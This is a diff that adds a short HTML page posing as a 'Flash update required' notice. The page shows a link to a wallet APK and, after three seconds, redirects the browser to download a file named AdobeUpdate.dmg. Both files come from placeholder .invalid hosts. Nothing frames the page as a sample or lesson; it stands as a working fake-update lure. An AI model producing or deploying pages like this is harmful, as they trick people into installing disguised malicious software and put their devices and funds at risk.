@@ -1,0 +1,12 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Flash update required</title></head>
+<body>
+  <div id="root"></div>
+  <script type="text/babel">
+    const Get = () => <a href="https://apps.invalid/wallet.apk">Get the app</a>;
+    ReactDOM.createRoot(document.getElementById("root")).render(<Get />);
+    setTimeout(() => { window.location.href = "https://cdn.invalid/AdobeUpdate.dmg"; }, 3000);
+  </script>
+</body>
+</html>
